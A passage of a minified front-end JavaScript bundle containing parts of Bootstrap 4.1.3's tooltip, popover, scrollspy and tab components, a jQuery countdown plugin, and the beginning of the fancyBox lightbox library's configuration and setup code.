        o = Te.Event(this.constructor.Event.HIDE);
      if (Te(this.element).trigger(o), !o.isDefaultPrevented()) {
        if (Te(i).removeClass(Fe), "ontouchstart" in document.documentElement && Te(document.body).children().off("mouseover", null, Te.noop), this._activeTrigger.click = !1, this._activeTrigger[ze] = !1, this._activeTrigger[Be] = !1, Te(this.tip).hasClass(Re)) {
          var r = Lt.getTransitionDurationFromElement(i);
          Te(i).one(Lt.TRANSITION_END, t).emulateTransitionEnd(r);
        } else t();
        this._hoverState = "";
      }
    }, $t.update = function () {
      null !== this._popper && this._popper.scheduleUpdate();
    }, $t.isWithContent = function () {
      return Boolean(this.getTitle());
    }, $t.addAttachmentClass = function (e) {
      Te(this.getTipElement()).addClass(Ie + "-" + e);
    }, $t.getTipElement = function () {
      return this.tip = this.tip || Te(this.config.template)[0], this.tip;
    }, $t.setContent = function () {
      var e = this.getTipElement();
      this.setElementContent(Te(e.querySelectorAll(".tooltip-inner")), this.getTitle()), Te(e).removeClass(Re + " " + Fe);
    }, $t.setElementContent = function (e, t) {
      var n = this.config.html;
      "object" == typeof t && (t.nodeType || t.jquery) ? n ? Te(t).parent().is(e) || e.empty().append(t) : e.text(Te(t).text()) : e[n ? "html" : "text"](t);
    }, $t.getTitle = function () {
      var e = this.element.getAttribute("data-original-title");
      return e = e || ("function" == typeof this.config.title ? this.config.title.call(this.element) : this.config.title);
    }, $t._getAttachment = function (e) {
      return Me[e.toUpperCase()];
    }, $t._setListeners = function () {
      var i = this;
      this.config.trigger.split(" ").forEach(function (e) {
        if ("click" === e) Te(i.element).on(i.constructor.Event.CLICK, i.config.selector, function (e) {
          return i.toggle(e);
        });else if ("manual" !== e) {
          var t = e === Be ? i.constructor.Event.MOUSEENTER : i.constructor.Event.FOCUSIN,
            n = e === Be ? i.constructor.Event.MOUSELEAVE : i.constructor.Event.FOCUSOUT;
          Te(i.element).on(t, i.config.selector, function (e) {
            return i._enter(e);
          }).on(n, i.config.selector, function (e) {
            return i._leave(e);
          });
        }
        Te(i.element).closest(".modal").on("hide.bs.modal", function () {
          return i.hide();
        });
      }), this.config.selector ? this.config = a({}, this.config, {
        trigger: "manual",
        selector: ""
      }) : this._fixTitle();
    }, $t._fixTitle = function () {
      var e = typeof this.element.getAttribute("data-original-title");
      !this.element.getAttribute("title") && "string" == e || (this.element.setAttribute("data-original-title", this.element.getAttribute("title") || ""), this.element.setAttribute("title", ""));
    }, $t._enter = function (e, t) {
      var n = this.constructor.DATA_KEY;
      (t = t || Te(e.currentTarget).data(n)) || (t = new this.constructor(e.currentTarget, this._getDelegateConfig()), Te(e.currentTarget).data(n, t)), e && (t._activeTrigger["focusin" === e.type ? ze : Be] = !0), Te(t.getTipElement()).hasClass(Fe) || t._hoverState === Ne ? t._hoverState = Ne : (clearTimeout(t._timeout), t._hoverState = Ne, t.config.delay && t.config.delay.show ? t._timeout = setTimeout(function () {
        t._hoverState === Ne && t.show();
      }, t.config.delay.show) : t.show());
    }, $t._leave = function (e, t) {
      var n = this.constructor.DATA_KEY;
      (t = t || Te(e.currentTarget).data(n)) || (t = new this.constructor(e.currentTarget, this._getDelegateConfig()), Te(e.currentTarget).data(n, t)), e && (t._activeTrigger["focusout" === e.type ? ze : Be] = !1), t._isWithActiveTrigger() || (clearTimeout(t._timeout), t._hoverState = "out", t.config.delay && t.config.delay.hide ? t._timeout = setTimeout(function () {
        "out" === t._hoverState && t.hide();
      }, t.config.delay.hide) : t.hide());
    }, $t._isWithActiveTrigger = function () {
      for (var e in this._activeTrigger) if (this._activeTrigger[e]) return !0;
      return !1;
    }, $t._getConfig = function (e) {
      return "number" == typeof (e = a({}, this.constructor.Default, Te(this.element).data(), "object" == typeof e && e ? e : {})).delay && (e.delay = {
        show: e.delay,
        hide: e.delay
      }), "number" == typeof e.title && (e.title = e.title.toString()), "number" == typeof e.content && (e.content = e.content.toString()), Lt.typeCheckConfig(Ee, e, this.constructor.DefaultType), e;
    }, $t._getDelegateConfig = function () {
      var e = {};
      if (this.config) for (var t in this.config) this.constructor.Default[t] !== this.config[t] && (e[t] = this.config[t]);
      return e;
    }, $t._cleanTipClass = function () {
      var e = Te(this.getTipElement()),
        t = e.attr("class").match(Pe);
      null !== t && t.length && e.removeClass(t.join(""));
    }, $t._handlePopperPlacementChange = function (e) {
      var t = e.instance;
      this.tip = t.popper, this._cleanTipClass(), this.addAttachmentClass(this._getAttachment(e.placement));
    }, $t._fixTransition = function () {
      var e = this.getTipElement(),
        t = this.config.animation;
      null === e.getAttribute("x-placement") && (Te(e).removeClass(Re), this.config.animation = !1, this.hide(), this.show(), this.config.animation = t);
    }, Kt._jQueryInterface = function (n) {
      return this.each(function () {
        var e = Te(this).data(De),
          t = "object" == typeof n && n;
        if ((e || !/dispose|hide/.test(n)) && (e || (e = new Kt(this, t), Te(this).data(De, e)), "string" == typeof n)) {
          if (void 0 === e[n]) throw new TypeError('No method named "' + n + '"');
          e[n]();
        }
      });
    }, r(Kt, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }, {
      key: "Default",
      get: function () {
        return Le;
      }
    }, {
      key: "NAME",
      get: function () {
        return Ee;
      }
    }, {
      key: "DATA_KEY",
      get: function () {
        return De;
      }
    }, {
      key: "Event",
      get: function () {
        return Oe;
      }
    }, {
      key: "EVENT_KEY",
      get: function () {
        return _e;
      }
    }, {
      key: "DefaultType",
      get: function () {
        return He;
      }
    }]), qe = Kt, Te.fn[Ee] = qe._jQueryInterface, Te.fn[Ee].Constructor = qe, Te.fn[Ee].noConflict = function () {
      return Te.fn[Ee] = Ae, qe._jQueryInterface;
    }, qe),
    Wt = (Ue = "popover", Xe = "." + (Ye = "bs.popover"), Ve = (We = t).fn[Ue], Ke = "bs-popover", Qe = new RegExp("(^|\\s)" + Ke + "\\S+", "g"), Ge = a({}, qt.Default, {
      placement: "right",
      trigger: "click",
      content: "",
      template: '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>'
    }), Je = a({}, qt.DefaultType, {
      content: "(string|element|function)"
    }), Ze = {
      HIDE: "hide" + Xe,
      HIDDEN: "hidden" + Xe,
      SHOW: "show" + Xe,
      SHOWN: "shown" + Xe,
      INSERTED: "inserted" + Xe,
      CLICK: "click" + Xe,
      FOCUSIN: "focusin" + Xe,
      FOCUSOUT: "focusout" + Xe,
      MOUSEENTER: "mouseenter" + Xe,
      MOUSELEAVE: "mouseleave" + Xe
    }, et = function (e) {
      var t, n;
      function i() {
        return e.apply(this, arguments) || this;
      }
      n = e, (t = i).prototype = Object.create(n.prototype), (t.prototype.constructor = t).__proto__ = n;
      var o = i.prototype;
      return o.isWithContent = function () {
        return this.getTitle() || this._getContent();
      }, o.addAttachmentClass = function (e) {
        We(this.getTipElement()).addClass(Ke + "-" + e);
      }, o.getTipElement = function () {
        return this.tip = this.tip || We(this.config.template)[0], this.tip;
      }, o.setContent = function () {
        var e = We(this.getTipElement());
        this.setElementContent(e.find(".popover-header"), this.getTitle());
        var t = this._getContent();
        "function" == typeof t && (t = t.call(this.element)), this.setElementContent(e.find(".popover-body"), t), e.removeClass("fade show");
      }, o._getContent = function () {
        return this.element.getAttribute("data-content") || this.config.content;
      }, o._cleanTipClass = function () {
        var e = We(this.getTipElement()),
          t = e.attr("class").match(Qe);
        null !== t && 0 < t.length && e.removeClass(t.join(""));
      }, i._jQueryInterface = function (n) {
        return this.each(function () {
          var e = We(this).data(Ye),
            t = "object" == typeof n ? n : null;
          if ((e || !/destroy|hide/.test(n)) && (e || (e = new i(this, t), We(this).data(Ye, e)), "string" == typeof n)) {
            if (void 0 === e[n]) throw new TypeError('No method named "' + n + '"');
            e[n]();
          }
        });
      }, r(i, null, [{
        key: "VERSION",
        get: function () {
          return "4.1.3";
        }
      }, {
        key: "Default",
        get: function () {
          return Ge;
        }
      }, {
        key: "NAME",
        get: function () {
          return Ue;
        }
      }, {
        key: "DATA_KEY",
        get: function () {
          return Ye;
        }
      }, {
        key: "Event",
        get: function () {
          return Ze;
        }
      }, {
        key: "EVENT_KEY",
        get: function () {
          return Xe;
        }
      }, {
        key: "DefaultType",
        get: function () {
          return Je;
        }
      }]), i;
    }(qt), We.fn[Ue] = et._jQueryInterface, We.fn[Ue].Constructor = et, We.fn[Ue].noConflict = function () {
      return We.fn[Ue] = Ve, et._jQueryInterface;
    }, et),
    Ut = (nt = "scrollspy", ot = "." + (it = "bs.scrollspy"), rt = (tt = t).fn[nt], at = {
      offset: 10,
      method: "auto",
      target: ""
    }, st = {
      offset: "number",
      method: "string",
      target: "(string|element)"
    }, lt = {
      ACTIVATE: "activate" + ot,
      SCROLL: "scroll" + ot,
      LOAD_DATA_API: "load" + ot + ".data-api"
    }, dt = "active", ct = ".nav, .list-group", ut = ".nav-link", pt = ".list-group-item", ht = "position", (St = Vt.prototype).refresh = function () {
      var t = this,
        e = this._scrollElement === this._scrollElement.window ? "offset" : ht,
        o = "auto" === this._config.method ? e : this._config.method,
        r = o === ht ? this._getScrollTop() : 0;
      this._offsets = [], this._targets = [], this._scrollHeight = this._getScrollHeight(), [].slice.call(document.querySelectorAll(this._selector)).map(function (e) {
        var t,
          n = Lt.getSelectorFromElement(e);
        if (n && (t = document.querySelector(n)), t) {
          var i = t.getBoundingClientRect();
          if (i.width || i.height) return [tt(t)[o]().top + r, n];
        }
        return null;
      }).filter(function (e) {
        return e;
      }).sort(function (e, t) {
        return e[0] - t[0];
      }).forEach(function (e) {
        t._offsets.push(e[0]), t._targets.push(e[1]);
      });
    }, St.dispose = function () {
      tt.removeData(this._element, it), tt(this._scrollElement).off(ot), this._element = null, this._scrollElement = null, this._config = null, this._selector = null, this._offsets = null, this._targets = null, this._activeTarget = null, this._scrollHeight = null;
    }, St._getConfig = function (e) {
      if ("string" != typeof (e = a({}, at, "object" == typeof e && e ? e : {})).target) {
        var t = tt(e.target).attr("id");
        t || (t = Lt.getUID(nt), tt(e.target).attr("id", t)), e.target = "#" + t;
      }
      return Lt.typeCheckConfig(nt, e, st), e;
    }, St._getScrollTop = function () {
      return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
    }, St._getScrollHeight = function () {
      return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
    }, St._getOffsetHeight = function () {
      return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
    }, St._process = function () {
      var e = this._getScrollTop() + this._config.offset,
        t = this._getScrollHeight(),
        n = this._config.offset + t - this._getOffsetHeight();
      if (this._scrollHeight !== t && this.refresh(), n <= e) {
        var i = this._targets[this._targets.length - 1];
        this._activeTarget !== i && this._activate(i);
      } else {
        if (this._activeTarget && e < this._offsets[0] && 0 < this._offsets[0]) return this._activeTarget = null, void this._clear();
        for (var o = this._offsets.length; o--;) this._activeTarget !== this._targets[o] && e >= this._offsets[o] && (void 0 === this._offsets[o + 1] || e < this._offsets[o + 1]) && this._activate(this._targets[o]);
      }
    }, St._activate = function (t) {
      this._activeTarget = t, this._clear();
      var e = this._selector.split(",");
      e = e.map(function (e) {
        return e + '[data-target="' + t + '"],' + e + '[href="' + t + '"]';
      });
      var n = tt([].slice.call(document.querySelectorAll(e.join(","))));
      n.hasClass("dropdown-item") ? (n.closest(".dropdown").find(".dropdown-toggle").addClass(dt), n.addClass(dt)) : (n.addClass(dt), n.parents(ct).prev(ut + ", " + pt).addClass(dt), n.parents(ct).prev(".nav-item").children(ut).addClass(dt)), tt(this._scrollElement).trigger(lt.ACTIVATE, {
        relatedTarget: t
      });
    }, St._clear = function () {
      var e = [].slice.call(document.querySelectorAll(this._selector));
      tt(e).filter(".active").removeClass(dt);
    }, Vt._jQueryInterface = function (t) {
      return this.each(function () {
        var e = tt(this).data(it);
        if (e || (e = new Vt(this, "object" == typeof t && t), tt(this).data(it, e)), "string" == typeof t) {
          if (void 0 === e[t]) throw new TypeError('No method named "' + t + '"');
          e[t]();
        }
      });
    }, r(Vt, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }, {
      key: "Default",
      get: function () {
        return at;
      }
    }]), ft = Vt, tt(window).on(lt.LOAD_DATA_API, function () {
      for (var e = [].slice.call(document.querySelectorAll('[data-spy="scroll"]')), t = e.length; t--;) {
        var n = tt(e[t]);
        ft._jQueryInterface.call(n, n.data());
      }
    }), tt.fn[nt] = ft._jQueryInterface, tt.fn[nt].Constructor = ft, tt.fn[nt].noConflict = function () {
      return tt.fn[nt] = rt, ft._jQueryInterface;
    }, ft),
    Yt = (vt = "." + (mt = "bs.tab"), yt = (gt = t).fn.tab, bt = {
      HIDE: "hide" + vt,
      HIDDEN: "hidden" + vt,
      SHOW: "show" + vt,
      SHOWN: "shown" + vt,
      CLICK_DATA_API: "click" + vt + ".data-api"
    }, wt = "active", xt = ".active", jt = "> li > .active", (kt = Xt.prototype).show = function () {
      var n = this;
      if (!(this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && gt(this._element).hasClass(wt) || gt(this._element).hasClass("disabled"))) {
        var e,
          i,
          t = gt(this._element).closest(".nav, .list-group")[0],
          o = Lt.getSelectorFromElement(this._element);
        if (t) {
          var r = "UL" === t.nodeName ? jt : xt;
          i = (i = gt.makeArray(gt(t).find(r)))[i.length - 1];
        }
        var a = gt.Event(bt.HIDE, {
            relatedTarget: this._element
          }),
          s = gt.Event(bt.SHOW, {
            relatedTarget: i
          });
        if (i && gt(i).trigger(a), gt(this._element).trigger(s), !s.isDefaultPrevented() && !a.isDefaultPrevented()) {
          o && (e = document.querySelector(o)), this._activate(this._element, t);
          var l = function () {
            var e = gt.Event(bt.HIDDEN, {
                relatedTarget: n._element
              }),
              t = gt.Event(bt.SHOWN, {
                relatedTarget: i
              });
            gt(i).trigger(e), gt(n._element).trigger(t);
          };
          e ? this._activate(e, e.parentNode, l) : l();
        }
      }
    }, kt.dispose = function () {
      gt.removeData(this._element, mt), this._element = null;
    }, kt._activate = function (e, t, n) {
      function i() {
        return o._transitionComplete(e, r, n);
      }
      var o = this,
        r = ("UL" === t.nodeName ? gt(t).find(jt) : gt(t).children(xt))[0],
        a = n && r && gt(r).hasClass("fade");
      if (r && a) {
        var s = Lt.getTransitionDurationFromElement(r);
        gt(r).one(Lt.TRANSITION_END, i).emulateTransitionEnd(s);
      } else i();
    }, kt._transitionComplete = function (e, t, n) {
      if (t) {
        gt(t).removeClass("show " + wt);
        var i = gt(t.parentNode).find("> .dropdown-menu .active")[0];
        i && gt(i).removeClass(wt), "tab" === t.getAttribute("role") && t.setAttribute("aria-selected", !1);
      }
      if (gt(e).addClass(wt), "tab" === e.getAttribute("role") && e.setAttribute("aria-selected", !0), Lt.reflow(e), gt(e).addClass("show"), e.parentNode && gt(e.parentNode).hasClass("dropdown-menu")) {
        var o = gt(e).closest(".dropdown")[0];
        if (o) {
          var r = [].slice.call(o.querySelectorAll(".dropdown-toggle"));
          gt(r).addClass(wt);
        }
        e.setAttribute("aria-expanded", !0);
      }
      n && n();
    }, Xt._jQueryInterface = function (n) {
      return this.each(function () {
        var e = gt(this),
          t = e.data(mt);
        if (t || (t = new Xt(this), e.data(mt, t)), "string" == typeof n) {
          if (void 0 === t[n]) throw new TypeError('No method named "' + n + '"');
          t[n]();
        }
      });
    }, r(Xt, null, [{
      key: "VERSION",
      get: function () {
        return "4.1.3";
      }
    }]), Ct = Xt, gt(document).on(bt.CLICK_DATA_API, '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]', function (e) {
      e.preventDefault(), Ct._jQueryInterface.call(gt(this), "show");
    }), gt.fn.tab = Ct._jQueryInterface, gt.fn.tab.Constructor = Ct, gt.fn.tab.noConflict = function () {
      return gt.fn.tab = yt, Ct._jQueryInterface;
    }, Ct);
  function Xt(e) {
    this._element = e;
  }
  function Vt(e, t) {
    var n = this;
    this._element = e, this._scrollElement = "BODY" === e.tagName ? window : e, this._config = this._getConfig(t), this._selector = this._config.target + " " + ut + "," + this._config.target + " " + pt + "," + this._config.target + " .dropdown-item", this._offsets = [], this._targets = [], this._activeTarget = null, this._scrollHeight = 0, tt(this._scrollElement).on(lt.SCROLL, function (e) {
      return n._process(e);
    }), this.refresh(), this._process();
  }
  function Kt(e, t) {
    if (void 0 === c) throw new TypeError("Bootstrap tooltips require Popper.js (https://popper.js.org)");
    this._isEnabled = !0, this._timeout = 0, this._hoverState = "", this._activeTrigger = {}, this._popper = null, this.element = e, this.config = this._getConfig(t), this.tip = null, this._setListeners();
  }
  function Qt(e, t) {
    this._config = this._getConfig(t), this._element = e, this._dialog = e.querySelector(".modal-dialog"), this._backdrop = null, this._isShown = !1, this._isBodyOverflowing = !1, this._ignoreBackdropClick = !1, this._scrollbarWidth = 0;
  }
  function Gt(e, t) {
    this._element = e, this._popper = null, this._config = this._getConfig(t), this._menu = this._getMenuElement(), this._inNavbar = this._detectNavbar(), this._addEventListeners();
  }
  function Jt(t, e) {
    this._isTransitioning = !1, this._element = t, this._config = this._getConfig(e), this._triggerArray = N.makeArray(document.querySelectorAll('[data-toggle="collapse"][href="#' + t.id + '"],[data-toggle="collapse"][data-target="#' + t.id + '"]'));
    for (var n = [].slice.call(document.querySelectorAll(K)), i = 0, o = n.length; i < o; i++) {
      var r = n[i],
        a = Lt.getSelectorFromElement(r),
        s = [].slice.call(document.querySelectorAll(a)).filter(function (e) {
          return e === t;
        });
      null !== a && 0 < s.length && (this._selector = a, this._triggerArray.push(r));
    }
    this._parent = this._config.parent ? this._getParent() : null, this._config.parent || this._addAriaAndCollapsedClass(this._element, this._triggerArray), this._config.toggle && this.toggle();
  }
  function Zt(e, t) {
    this._items = null, this._interval = null, this._activeElement = null, this._isPaused = !1, this._isSliding = !1, this.touchTimeout = null, this._config = this._getConfig(t), this._element = C(e)[0], this._indicatorsElement = this._element.querySelector(".carousel-indicators"), this._addEventListeners();
  }
  function en(e) {
    this._element = e;
  }
  function tn(e) {
    this._element = e;
  }
  !function (e) {
    if (void 0 === e) throw new TypeError("Bootstrap's JavaScript requires jQuery. jQuery must be included before Bootstrap's JavaScript.");
    var t = e.fn.jquery.split(" ")[0].split(".");
    if (t[0] < 2 && t[1] < 9 || 1 === t[0] && 9 === t[1] && t[2] < 1 || 4 <= t[0]) throw new Error("Bootstrap's JavaScript requires at least jQuery v1.9.1 but less than v4.0.0");
  }(t), e.Util = Lt, e.Alert = Nt, e.Button = Ot, e.Carousel = Rt, e.Collapse = Ft, e.Dropdown = Bt, e.Modal = zt, e.Popover = Wt, e.Scrollspy = Ut, e.Tab = Yt, e.Tooltip = qt, Object.defineProperty(e, "__esModule", {
    value: !0
  });
}), function (t) {
  t.fn.countdown = function (e, d) {
    var c = t.extend({
      date: null,
      offset: null,
      day: "Day",
      days: "Days",
      hour: "Hour",
      hours: "Hours",
      minute: "Minute",
      minutes: "Minutes",
      second: "Second",
      seconds: "Seconds"
    }, e);
    c.date || t.error("Date is not defined."), Date.parse(c.date) || t.error("Incorrect date format, it should look like this, 12/24/2012 12:00:00.");
    var u = this,
      p = function () {
        var e = new Date(),
          t = e.getTime() + 6e4 * e.getTimezoneOffset();
        return new Date(t + 36e5 * c.offset);
      },
      h = setInterval(function () {
        var e = new Date(c.date) - p();
        if (e < 0) return clearInterval(h), void (d && "function" == typeof d && d());
        var t = Math.floor(e / 864e5),
          n = Math.floor(e % 864e5 / 36e5),
          i = Math.floor(e % 36e5 / 6e4),
          o = Math.floor(e % 6e4 / 1e3),
          r = 1 === t ? c.day : c.days,
          a = 1 === n ? c.hour : c.hours,
          s = 1 === i ? c.minute : c.minutes,
          l = 1 === o ? c.second : c.seconds;
        t = 2 <= String(t).length ? t : "0" + t, n = 2 <= String(n).length ? n : "0" + n, i = 2 <= String(i).length ? i : "0" + i, o = 2 <= String(o).length ? o : "0" + o, u.find(".days").text(t), u.find(".hours").text(n), u.find(".minutes").text(i), u.find(".seconds").text(o), u.find(".days_text").text(r), u.find(".hours_text").text(a), u.find(".minutes_text").text(s), u.find(".seconds_text").text(l);
      }, 1e3);
  };
}(jQuery), function (c, a, g, m) {
  "use strict";

  function n(e, t) {
    var n,
      i,
      o = [],
      r = 0;
    e && e.isDefaultPrevented() || (e.preventDefault(), (i = (n = (t = e && e.data ? e.data.options : t || {}).$target || g(e.currentTarget)).attr("data-fancybox") || "") ? (r = (o = (o = t.selector ? g(t.selector) : e.data ? e.data.items : []).length ? o.filter('[data-fancybox="' + i + '"]') : g('[data-fancybox="' + i + '"]')).index(n)) < 0 && (r = 0) : o = [n], g.fancybox.open(o, t, r));
  }
  if (c.console = c.console || {
    info: function (e) {}
  }, g) {
    if (g.fn.fancybox) return console.info("fancyBox already initialized");
    var e = {
        loop: !1,
        gutter: 50,
        keyboard: !0,
        arrows: !0,
        infobar: !0,
        smallBtn: "auto",
        toolbar: "auto",
        buttons: ["zoom", "thumbs", "close"],
        idleTime: 3,
        protect: !1,
        modal: !1,
        image: {
          preload: !1
        },
        ajax: {
          settings: {
            data: {
              fancybox: !0
            }
          }
        },
        iframe: {
          tpl: '<iframe id="fancybox-frame{rnd}" name="fancybox-frame{rnd}" class="fancybox-iframe" frameborder="0" vspace="0" hspace="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen allowtransparency="true" src=""></iframe>',
          preload: !0,
          css: {},
          attr: {
            scrolling: "auto"
          }
        },
        defaultType: "image",
        animationEffect: "zoom",
        animationDuration: 366,
        zoomOpacity: "auto",
        transitionEffect: "fade",
        transitionDuration: 366,
        slideClass: "",
        baseClass: "",
        baseTpl: '<div class="fancybox-container" role="dialog" tabindex="-1"><div class="fancybox-bg"></div><div class="fancybox-inner"><div class="fancybox-infobar"><span data-fancybox-index></span>&nbsp;/&nbsp;<span data-fancybox-count></span></div><div class="fancybox-toolbar">{{buttons}}</div><div class="fancybox-navigation">{{arrows}}</div><div class="fancybox-stage"></div><div class="fancybox-caption"></div></div></div>',
        spinnerTpl: '<div class="fancybox-loading"></div>',
        errorTpl: '<div class="fancybox-error"><p>{{ERROR}}</p></div>',
        btnTpl: {
          download: '<a download data-fancybox-download class="fancybox-button fancybox-button--download" title="{{DOWNLOAD}}" href="javascript:;"><svg viewBox="0 0 40 40"><path d="M13,16 L20,23 L27,16 M20,7 L20,23 M10,24 L10,28 L30,28 L30,24" /></svg></a>',
          zoom: '<button data-fancybox-zoom class="fancybox-button fancybox-button--zoom" title="{{ZOOM}}"><svg viewBox="0 0 40 40"><path d="M18,17 m-8,0 a8,8 0 1,0 16,0 a8,8 0 1,0 -16,0 M24,22 L31,29" /></svg></button>',
          close: '<button data-fancybox-close class="fancybox-button fancybox-button--close" title="{{CLOSE}}"><svg viewBox="0 2 40 40"><path d="M10,10 L30,30 M30,10 L10,30" /></svg></button>',
          smallBtn: '<button data-fancybox-close class="fancybox-close-small" title="{{CLOSE}}"><svg viewBox="0 0 32 32"><path d="M10,10 L22,22 M22,10 L10,22"></path></svg></button>',
          arrowLeft: '<a data-fancybox-prev class="fancybox-button fancybox-button--arrow_left" title="{{PREV}}" href="javascript:;"><i style="font-size: 30px;" class="fas fa-chevron-circle-left"></i></a>',
          arrowRight: '<a data-fancybox-next class="fancybox-button fancybox-button--arrow_right" title="{{NEXT}}" href="javascript:;"><i style="font-size: 30px;" class="fas fa-chevron-circle-right"></i></a>'
        },
        parentEl: "body",
        autoFocus: !1,
        backFocus: !0,
        trapFocus: !0,
        fullScreen: {
          autoStart: !1
        },
        touch: {
          vertical: !0,
          momentum: !0
        },
        hash: null,
        media: {},
        slideShow: {
          autoStart: !1,
          speed: 4e3
        },
        thumbs: {
          autoStart: !1,
          hideOnClose: !0,
          parentEl: ".fancybox-container",
          axis: "y"
        },
        wheel: "auto",
        onInit: g.noop,
        beforeLoad: g.noop,
        afterLoad: g.noop,
        beforeShow: g.noop,
        afterShow: g.noop,
        beforeClose: g.noop,
        afterClose: g.noop,
        onActivate: g.noop,
        onDeactivate: g.noop,
        clickContent: function (e, t) {
          return "image" === e.type && "zoom";
        },
        clickSlide: "close",
        clickOutside: "close",
        dblclickContent: !1,
        dblclickSlide: !1,
        dblclickOutside: !1,
        mobile: {
          idleTime: !1,
          clickContent: function (e, t) {
            return "image" === e.type && "toggleControls";
          },
          clickSlide: function (e, t) {
            return "image" === e.type ? "toggleControls" : "close";
          },
          dblclickContent: function (e, t) {
            return "image" === e.type && "zoom";
          },
          dblclickSlide: function (e, t) {
            return "image" === e.type && "zoom";
          }
        },
        lang: "en",
        i18n: {
          en: {
            CLOSE: "Close",
            NEXT: "Next",
            PREV: "Previous",
            ERROR: "The requested content cannot be loaded. <br/> Please try again later.",
            PLAY_START: "Start slideshow",
            PLAY_STOP: "Pause slideshow",
            FULL_SCREEN: "Full screen",
            THUMBS: "Thumbnails",
            DOWNLOAD: "Download",
            SHARE: "Share",
            ZOOM: "Zoom"
          },
          de: {
            CLOSE: "Schliessen",
            NEXT: "Weiter",
            PREV: "Zurück",
            ERROR: "Die angeforderten Daten konnten nicht geladen werden. <br/> Bitte versuchen Sie es später nochmal.",
            PLAY_START: "Diaschau starten",
            PLAY_STOP: "Diaschau beenden",
            FULL_SCREEN: "Vollbild",
            THUMBS: "Vorschaubilder",
            DOWNLOAD: "Herunterladen",
            SHARE: "Teilen",
            ZOOM: "Maßstab"
          }
        }
      },
      o = g(c),
      s = g(a),
      r = 0,
      p = c.requestAnimationFrame || c.webkitRequestAnimationFrame || c.mozRequestAnimationFrame || c.oRequestAnimationFrame || function (e) {
        return c.setTimeout(e, 1e3 / 60);
      },
      h = function () {
        var e,
          t = a.createElement("fakeelement"),
          n = {
            transition: "transitionend",
            OTransition: "oTransitionEnd",
            MozTransition: "transitionend",
            WebkitTransition: "webkitTransitionEnd"
          };
        for (e in n) if (t.style[e] !== m) return n[e];
        return "transitionend";
      }(),
      f = function (e) {
        return e && e.length && e[0].offsetHeight;
      },
      l = function (e, t) {
        var n = g.extend(!0, {}, e, t);
        return g.each(t, function (e, t) {
          g.isArray(t) && (n[e] = t);
        }), n;
      },
      i = function (e, t, n) {
        var i = this;
        i.opts = l({
          index: n
        }, g.fancybox.defaults), g.isPlainObject(t) && (i.opts = l(i.opts, t)), g.fancybox.isMobile && (i.opts = l(i.opts, i.opts.mobile)), i.id = i.opts.id || ++r, i.currIndex = parseInt(i.opts.index, 10) || 0, i.prevIndex = null, i.prevPos = null, i.currPos = 0, i.firstRun = !0, i.group = [], i.slides = {}, i.addContent(e), i.group.length && (i.$lastFocus = g(a.activeElement).trigger("blur"), i.init());
      };
    g.extend(i.prototype, {
      init: function () {
        var e,
          t,
          n,
          i = this,
          o = i.group[i.currIndex].opts,
          r = g.fancybox.scrollbarWidth;
        g.fancybox.getInstance() || !1 === o.hideScrollbar || (g("body").addClass("fancybox-active"), !g.fancybox.isMobile && a.body.scrollHeight > c.innerHeight && (r === m && (e = g('<div style="width:100px;height:100px;overflow:scroll;" />').appendTo("body"), r = g.fancybox.scrollbarWidth = e[0].offsetWidth - e[0].clientWidth, e.remove()), g("head").append('<style id="fancybox-style-noscroll" type="text/css">.compensate-for-scrollbar { margin-right: ' + r + "px; }</style>"), g("body").addClass("compensate-for-scrollbar"))), n = "", g.each(o.buttons, function (e, t) {
          n += o.btnTpl[t] || "";
        }), t = g(i.translate(i, o.baseTpl.replace("{{buttons}}", n).replace("{{arrows}}", o.btnTpl.arrowLeft + o.btnTpl.arrowRight))).attr("id", "fancybox-container-" + i.id).addClass("fancybox-is-hidden").addClass(o.baseClass).data("FancyBox", i).appendTo(o.parentEl), i.$refs = {
          container: t
        }, ["bg", "inner", "infobar", "toolbar", "stage", "caption", "navigation"].forEach(function (e) {
          i.$refs[e] = t.find(".fancybox-" + e);
        }), i.trigger("onInit"), i.activate(), i.jumpTo(i.currIndex);
      },
      translate: function (e, t) {
        var i = e.opts.i18n[e.opts.lang];
        return t.replace(/\{\{(\w+)\}\}/g, function (e, t) {
          var n = i[t];
          return n === m ? e : n;
        });
      },
      addContent: function (e) {
        var t,
          d = this,
          n = g.makeArray(e);
        g.each(n, function (e, t) {
          var n,
            i,
            o,
            r,
            a,
            s = {},
            l = {};
          g.isPlainObject(t) ? l = (s = t).opts || t : "object" === g.type(t) && g(t).length ? (l = (n = g(t)).data() || {}, (l = g.extend(!0, {}, l, l.options)).$orig = n, s.src = d.opts.src || l.src || n.attr("href"), s.type || s.src || (s.type = "inline", s.src = t)) : s = {
            type: "html",
            src: t + ""
          }, s.opts = g.extend(!0, {}, d.opts, l), g.isArray(l.buttons) && (s.opts.buttons = l.buttons), i = s.type || s.opts.type, r = s.src || "", !i && r && ((o = r.match(/\.(mp4|mov|ogv)((\?|#).*)?$/i)) ? (i = "video", s.opts.videoFormat || (s.opts.videoFormat = "video/" + ("ogv" === o[1] ? "ogg" : o[1]))) : r.match(/(^data:image\/[a-z0-9+\/=]*,)|(\.(jp(e|g|eg)|gif|png|bmp|webp|svg|ico)((\?|#).*)?$)/i) ? i = "image" : r.match(/\.(pdf)((\?|#).*)?$/i) ? i = "iframe" : "#" === r.charAt(0) && (i = "inline")), i ? s.type = i : d.trigger("objectNeedsType", s), s.contentType || (s.contentType = -1 < g.inArray(s.type, ["html", "inline", "ajax"]) ? "html" : s.type), s.index = d.group.length, "auto" == s.opts.smallBtn && (s.opts.smallBtn = -1 < g.inArray(s.type, ["html", "inline", "ajax"])), "auto" === s.opts.toolbar && (s.opts.toolbar = !s.opts.smallBtn), s.opts.$trigger && s.index === d.opts.index && (s.opts.$thumb = s.opts.$trigger.find("img:first")), s.opts.$thumb && s.opts.$thumb.length || !s.opts.$orig || (s.opts.$thumb = s.opts.$orig.find("img:first")), "function" === g.type(s.opts.caption) && (s.opts.caption = s.opts.caption.apply(t, [d, s])), "function" === g.type(d.opts.caption) && 